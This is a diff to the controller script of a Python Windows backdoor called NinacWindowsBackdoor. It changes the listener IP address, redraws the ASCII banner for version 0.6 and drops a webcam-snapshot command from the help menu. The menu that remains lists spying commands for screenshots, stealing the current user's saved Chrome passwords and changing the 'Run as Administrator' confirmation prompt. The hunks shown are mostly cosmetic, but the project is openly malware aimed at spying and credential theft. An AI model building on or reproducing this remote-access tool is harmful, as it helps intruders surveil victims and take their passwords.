@@ -7,7 +7,7 @@ import datetime
 from halo import Halo
 from colorama import Fore, init
 
-ip = "192.168.0.76"
+ip = "192.168.0.13"
 port = 8080
 
 class server_backdoor:
@@ -34,17 +34,18 @@ class server_backdoor:
 
     def show_painting(self):
         try:
-            print("""\t{}______            _       _                  
-        | ___ \          | |     | |
-        | |_/ / __ _  ___| | ____| | ___   ___  _ __ 
-        | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
-        | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
-        \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
-                                (NinacWindowsBackdoor)
+            print("""\t{}                 
+    _   _ _                  ____             _       _                  
+    | \ | (_)_ __   __ _  ___| __ )  __ _  ___| | ____| | ___   ___  _ __ 
+    |  \| | | '_ \ / _` |/ __|  _ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
+    | |\  | | | | | (_| | (__| |_) | (_| | (__|   < (_| | (_) | (_) | |   
+    |_| \_|_|_| |_|\__,_|\___|____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|  
+                
+                        (NinacWindowsBackdoor)
 
-                                Version 0.5
-                                Github: https://github.com/felipecaninnovaes/NinacWindowsBackdoor
-                                                        {}\n\n""".format(Fore.BLUE, Fore.RESET))
+                        Version 0.6
+                        Github: https://github.com/felipecaninnovaes/NinacWindowsBackdoor
+                                                {}\n\n""".format(Fore.RED, Fore.RESET))
                 
         except Exception as e:
             return "[-] Couldn't show the start painting: {}".format(e)
@@ -148,7 +149,6 @@ class server_backdoor:
 
         print("\nSpying\n======\n")
         print("Command\t\tDescription\n-------\t\t-----------")
-        print("{}\t\t{}".format("webcam", "Get a snap of the webcam."))
         print("{}\t{}".format("screenshot", "Take a screenshot."))
         print("{}\t{}".format("password", "Get Chrome Passowrd on current user."))
         print("{}\t{}".format("enableadm", "Enable 'Run as Administrator' dialog confirmation"))
